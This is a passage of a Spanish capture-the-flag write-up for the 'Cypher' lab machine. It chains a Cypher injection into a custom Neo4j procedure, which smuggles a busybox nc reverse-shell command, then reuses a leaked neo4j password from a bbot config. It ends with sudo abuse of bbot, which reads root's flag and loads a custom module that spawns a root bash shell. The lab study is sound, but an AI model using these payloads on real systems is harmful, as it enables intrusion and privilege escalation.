            <span class="token punctuation">}</span>  
        <span class="token punctuation">}</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span>errorOutput<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Error output:\n"</span> <span class="token operator">+</span> errorOutput<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
        <span class="token keyword">return</span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringOutput</span><span class="token punctuation">(</span>statusCode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token comment">/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">StringOutput</span> <span class="token punctuation">{</span>  
        <span class="token keyword">public</span> <span class="token class-name">String</span> statusCode<span class="token punctuation">;</span>  
  
        <span class="token keyword">public</span> <span class="token class-name">StringOutput</span><span class="token punctuation">(</span><span class="token class-name">String</span> statusCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token keyword">this</span><span class="token punctuation">.</span>statusCode <span class="token operator">=</span> statusCode<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ul"><ul>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Ejecución de comandos arbitrarios</strong> :<br>
La función utiliza <code>Runtime.exec()</code> para ejecutar un comando <code>curl</code> en el sistema operativo subyacente. Esto puede ser vulnerable si no se sanitizan adecuadamente las entradas. Por ejemplo:
<ul>
<li data-line="3" dir="auto">Si la variable <code>url</code> no se valida correctamente, podría permitir inyección de comandos.</li>
</ul>
</li>
</ul></div></div></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Neo4j" dir="auto" class="heading" id="Neo4j">Neo4j</h1><div class="heading-children"><div class="el-p"><p dir="auto">En el codigo observamos la version de neo4j , dentro de META-INF en el pom.xml</p></div><div class="el-pre"><pre class="language-java" tabindex="0"><code data-line="0" class="language-java is-loaded"><span class="token operator">&lt;</span>project xmlns<span class="token operator">=</span><span class="token string">"http://maven.apache.org/POM/4.0.0"</span>  
         xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>  
         xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span><span class="token string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="token operator">&gt;</span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>modelVersion<span class="token punctuation">&gt;</span></span><span class="token number">4.0</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>modelVersion<span class="token operator">&gt;</span>  
  
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>com<span class="token punctuation">.</span>cypher<span class="token punctuation">.</span>neo4j<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>custom<span class="token operator">-</span>apoc<span class="token operator">-</span>extension<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>  
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">1.0</span><span class="token operator">-</span><span class="token constant">SNAPSHOT</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>  
  
    <span class="token generics"><span class="token punctuation">&lt;</span>properties<span class="token punctuation">&gt;</span></span>  
        <span class="token generics"><span class="token punctuation">&lt;</span>neo4j<span class="token punctuation">.</span>version<span class="token punctuation">&gt;</span></span><span class="token number">5.23</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>neo4j<span class="token punctuation">.</span>version<span class="token operator">&gt;</span>  
        <span class="token generics"><span class="token punctuation">&lt;</span>maven<span class="token punctuation">.</span>compiler<span class="token punctuation">.</span>source<span class="token punctuation">&gt;</span></span><span class="token number">11</span><span class="token operator">&lt;</span><span class="token operator">/</span>maven<span class="token punctuation">.</span>compiler<span class="token punctuation">.</span>source<span class="token operator">&gt;</span>  
        <span class="token generics"><span class="token punctuation">&lt;</span>maven<span class="token punctuation">.</span>compiler<span class="token punctuation">.</span>target<span class="token punctuation">&gt;</span></span><span class="token number">11</span><span class="token operator">&lt;</span><span class="token operator">/</span>maven<span class="token punctuation">.</span>compiler<span class="token punctuation">.</span>target<span class="token operator">&gt;</span>  
   
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Neo4j funciona bajo consultas <code>cypher</code> ; que hacen llamadas a neo4j; a diferencia de SQL, que está diseñado para bases de datos relacionales, Cypher se centra en la manipulación y el análisis de datos estructurados en forma de grafos, donde los nodos representan entidades y las relaciones (o aristas) representan conexiones entre ellas.</p></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="RCE" dir="auto" class="heading" id="RCE">RCE</h1><div class="heading-children"><div class="el-p"><p dir="auto">Podemos triggerear el curl en endpoint <code>/login</code> de la pagina de cypher</p></div><div class="el-p"><p dir="auto">El codigo para explotar el RCE se ve tal que asi </p></div><div class="el-pre"><pre class="language-cypher" tabindex="0"><code data-line="0" class="language-cypher is-loaded">a' <span class="token keyword">return</span> h<span class="token punctuation">.</span>value <span class="token keyword">as</span> a <span class="token keyword">UNION</span> <span class="token keyword">CALL</span> custom<span class="token punctuation">.</span><span class="token function">getUrlStatusCode</span><span class="token punctuation">(</span><span class="token string">"example.com;&lt;payload&gt;;#"</span><span class="token punctuation">)</span> <span class="token keyword">YIELD</span> statusCode <span class="token keyword">AS</span> a <span class="token keyword">RETURN</span> a<span class="token punctuation">;</span><span class="token comment">//</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">El payload comienza cerrando el contexto de cadena existente en la consulta Cypher con una <code>'</code>. Esto efectivamente termina la estructura de la consulta prevista, permitiendo al atacante adjuntar su código malicioso.</p></div><div class="el-p"><p dir="auto"><strong>Primera cláusula RETURN (RETURN h.value AS a):</strong><br>
Este segmento intenta devolver el valor de <code>h.value</code> alias como <code>a</code>. Si <code>h</code> no está definido, esta parte podría no producir salida significativa, pero sirve para alinear la estructura de la consulta para el subsiguiente <code>UNION</code>.</p></div><div class="el-p"><p dir="auto"><strong>Cláusula UNION:</strong><br>
El operador <code>UNION</code> combina los resultados de dos consultas. En este contexto, fusiona el resultado de la consulta benigna con el malicioso, facilitando la ejecución del código del atacante.</p></div><div class="el-p"><p dir="auto"><strong>Llamada al procedimiento custom.getUrlStatusCode(...):</strong><br>
Este procedimiento personalizado se explota para realizar una solicitud HTTP y luego un comando aprovechando el codigo del .jar . La URL proporcionada incluye una inyección de comandos:<br>
<code>http://10.10.x.x:8000;busybox nc 10.10.14.195 443 -e sh;#</code><br>
Aquí, el punto y coma (<code>;</code>) permite la ejecución de múltiples comandos. Después de intentar acceder a <code>http://10.10.x.x:8000/</code>, se ejecuta <code>busybox nc 10.10.14.195 443 -e sh</code>, lo cual inicia una conexión de shell inversa hacia la máquina del atacante.</p></div><div class="el-p"><p dir="auto"><strong>Cláusulas YIELD y RETURN finales:</strong><br>
<code>YIELD statusCode AS a</code> captura el código de estado HTTP desde la llamada a <code>getUrlStatusCode</code>, alias como <code>a</code>. El subsiguiente <code>RETURN a</code> devuelve este código de estado. Aunque el código de estado en sí mismo podría ser de interés limitado, estas cláusulas aseguran que la consulta se ejecute sin errores de sintaxis, facilitando el objetivo principal de <strong>rce</strong>.</p></div><div class="el-p"><p dir="auto">para mas info acerca de la explotacion y de los comandos cyphers podemos consultar <a data-tooltip-position="top" aria-label="obsidian://open?vault=HTB&amp;file=Machines%2FCypher%2FCypher%20commands%20y%20RCE%20en%20cypher" rel="noopener nofollow" class="external-link" href="obsidian://open?vault=HTB&amp;file=Machines%2FCypher%2FCypher%20commands%20y%20RCE%20en%20cypher" target="_blank">Cypher commands y RCE en cypher</a></p></div><div class="el-hr"><hr></div><div class="el-h2 heading-wrapper"><h2 data-heading="POC" dir="auto" class="heading" id="POC"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>POC</h2><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">a' <span class="token builtin class-name">return</span> h.value as a UNION CALL custom.getUrlStatusCode<span class="token punctuation">(</span><span class="token string">"http://10.10.14.167:8000;busybox nc 10.10.14.167 2323 -e sh;#"</span><span class="token punctuation">)</span> YIELD statusCode AS a RETURN a<span class="token punctuation">;</span>// 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250306122642.png" src="Pasted image 20250306122642.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250306122642.png" src="machines/cypher/imgs/pasted-image-20250306122642.png"></span></p></div><div class="el-p"><p dir="auto">Una vez establecida una rev shell con <code>busybox</code> encontramos credenciales del usuario graphasm en el siguiente path:</p></div><div class="el-p"><p dir="auto"><code>/home/graphasm/bbot_scans</code></p></div><div class="el-pre"><pre class="language-cypher" tabindex="0"><code data-line="0" class="language-cypher is-loaded">targets<span class="token operator">:</span>
  <span class="token operator">-</span> ecorp<span class="token punctuation">.</span>htb

output_dir<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>graphasm<span class="token operator">/</span>bbot_scans

config<span class="token operator">:</span>
  <span class="token class-name">modules</span><span class="token operator">:</span>
    <span class="token class-name">neo4j</span><span class="token operator">:</span>
      <span class="token class-name">username</span><span class="token operator">:</span> neo4j
      password<span class="token operator">:</span> cU4btyib<span class="token punctuation">.</span>20xtCMCXkBmerhK
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250306115911.png" src="Pasted image 20250306115911.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250306115911.png" src="machines/cypher/imgs/pasted-image-20250306115911.png"></span></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="sudo -l" dir="auto" class="heading" id="sudo_-l"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>sudo -l</h3><div class="heading-children"><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">graphasm@cypher:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> graphasm on cypher:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/bbot

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Podemos usar como sudo el binario <code>bbot</code> vamos a analizarlo </p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="http://www.blacklanternsecurity.com/bbot" rel="noopener nofollow" class="external-link" href="http://www.blacklanternsecurity.com/bbot" target="_blank">www.blacklanternsecurity.com/bbot</a></p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">graphasm@cypher<span class="token punctuation">:</span><span class="token operator">~</span>$ <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>bbot
  ______  _____   ____ _______
 <span class="token operator">|</span>  ___ \<span class="token operator">|</span>  __ \ <span class="token operator">/</span> __ \__   __<span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span>  ___ <span class="token operator">&lt;</span><span class="token operator">|</span>  __ <span class="token operator">&lt;</span><span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span> <span class="token operator">|</span>___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>
 <span class="token operator">|</span>______<span class="token operator">/</span><span class="token operator">|</span>_____<span class="token operator">/</span> \____<span class="token operator">/</span>  <span class="token operator">|</span>_<span class="token operator">|</span>
 BIGHUGE BLS OSINT TOOL v2<span class="token punctuation">.</span><span class="token number">1.0</span><span class="token punctuation">.</span>4939rc

www<span class="token punctuation">.</span>blacklanternsecurity<span class="token punctuation">.</span>com<span class="token operator">/</span>bbot

<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Creating BBOT config at <span class="token operator">/</span>home<span class="token operator">/</span>graphasm<span class="token operator">/</span><span class="token punctuation">.</span>config<span class="token operator">/</span>bbot<span class="token operator">/</span>bbot<span class="token punctuation">.</span>yml
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Creating BBOT secrets at <span class="token operator">/</span>home<span class="token operator">/</span>graphasm<span class="token operator">/</span><span class="token punctuation">.</span>config<span class="token operator">/</span>bbot<span class="token operator">/</span>secrets<span class="token punctuation">.</span>yml
usage<span class="token punctuation">:</span> bbot <span class="token punctuation">[</span><span class="token operator">-</span>h<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>t TARGET <span class="token punctuation">[</span>TARGET <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>w WHITELIST <span class="token punctuation">[</span>WHITELIST <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>b BLACKLIST <span class="token punctuation">[</span>BLACKLIST <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
            <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>strict<span class="token operator">-</span>scope<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>p <span class="token punctuation">[</span>PRESET <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>c <span class="token punctuation">[</span>CONFIG <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>lp<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>m MODULE <span class="token punctuation">[</span>MODULE <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>l<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>lmo<span class="token punctuation">]</span>
            <span class="token punctuation">[</span><span class="token operator">-</span>em MODULE <span class="token punctuation">[</span>MODULE <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>f FLAG <span class="token punctuation">[</span>FLAG <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>lf<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>rf FLAG <span class="token punctuation">[</span>FLAG <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>ef FLAG <span class="token punctuation">[</span>FLAG <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
            <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>allow<span class="token operator">-</span>deadly<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>n SCAN_NAME<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>d<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>s<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>force<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>y<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>dry<span class="token operator">-</span>run<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>preset<span class="token punctuation">]</span>
            <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>preset<span class="token operator">-</span>full<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>o DIR<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>om MODULE <span class="token punctuation">[</span>MODULE <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>json<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">-</span>brief<span class="token punctuation">]</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><strong>BBOT (Better Business Operating Tool)</strong> es una herramienta de <strong>OSINT (Open-Source Intelligence)</strong> de código abierto diseñada para automatizar la recolección de información y el análisis de datos públicos. Fue desarrollada originalmente por la empresa de ciberseguridad <strong>Rapid7</strong> y se enfoca en facilitar la investigación de amenazas, el análisis de redes y la identificación de vulnerabilidades.</p></div><div class="el-p"><p dir="auto">Vemos que corre en el sistema bajo la versión 2.1.0.4939</p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="FILE READ" dir="auto" class="heading" id="FILE_READ"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>FILE READ</h3><div class="heading-children"><div class="el-p"><p dir="auto">Podemos leer archivos con la herramienta de bbot corriendola como sudo , los parametros son los siguientes:<br>
-c [CONFIG ...], --config [CONFIG ...]<br>
Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'<br>
Para leer un archivo de configuracion ; en nuestro caso le pasaremos el archivo <code>/root/root.txt</code><br>
-d, --debug           Enable debugging<br>
a modo de "verbose" de esta forma nos muestra por pantalla el contenido del archivo<br>
-y, --yes             Skip scan confirmation prompt<br>
Para saltarnos el prompt de confirmacion forzando al programa a actuar</p></div><div class="el-p"><p dir="auto"> El comando quedaria de la siguiente manera</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded">graphasm@cypher:~$ <span class="token function">sudo</span> /usr/local/bin/bbot <span class="token parameter variable">-cy</span> /root/root.txt <span class="token parameter variable">-d</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Por consola nos promptea la flag de root</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token punctuation">[</span>DBUG<span class="token punctuation">]</span> internal.excavate: Final combined yara rule contents: 80fc93baa918264<span class="token punctuation">..</span>.
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="SHELL" dir="auto" class="heading" id="SHELL"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SHELL</h2><div class="heading-children"><div class="el-p"><p dir="auto">A continuación dejo varios documentos del binario que me han ayudado a entender bien como funciona para poder llegar a invocar una shell; </p></div><div class="el-p"><p dir="auto"><a rel="noopener nofollow" class="external-link" title="https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line" href="https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line" target="_blank">https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line</a><br>
<a rel="noopener nofollow" class="external-link" title="https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/" href="https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/" target="_blank">https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/</a> </p></div><div class="el-p"><p dir="auto">Podemos invocar una shell con <code>bbot</code> cargando un custom module : <a rel="noopener nofollow" class="external-link" title="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/" href="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/" target="_blank">https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/</a></p></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="" data-callout="load-modules-from-custom-locations" class="callout"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-pencil"><path d="M21.174 6.812a1 1 0 0 0-3.986-3.987L3.842 16.174a2 2 0 0 0-.5.83l-1.321 4.352a.5.5 0 0 0 .623.622l4.353-1.32a2 2 0 0 0 .83-.497z"></path><path d="m15 5 4 4"></path></svg></div><div class="callout-title-inner">Load modules from custom locations</div></div><div class="callout-content">
<p dir="auto">If you have a custom module and you want to use it with BBOT, you can add its parent folder to <code>module_dirs</code>. This saves you from having to copy it into the BBOT install location. To add a custom module directory, add it to <code>module_dirs</code> in your preset:</p>
</div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="POC" dir="auto" class="heading" id="POC"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>POC</h3><div class="heading-children"><div class="el-p"><p dir="auto">para obtener la  shell creamos un preset en el home directory y anadimos el path donde vamos a situar el module que nos permita invocar una shell de root;</p></div><div class="el-p"><p dir="auto"><strong>preset.yml:</strong></p></div><div class="el-pre"><pre><code data-line="0"># load BBOT modules from these additional paths
module_dirs:
  - /home/graphasm/CustomModules
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Creamos un module dentro del path indicado en el preset; se hace en python importando las librerias de bbot</p></div><div class="el-p"><p dir="auto"><strong>module.py:</strong></p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded"><span class="token keyword">from</span> bbot<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseModule
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">vaina</span><span class="token punctuation">(</span>BaseModule<span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span>

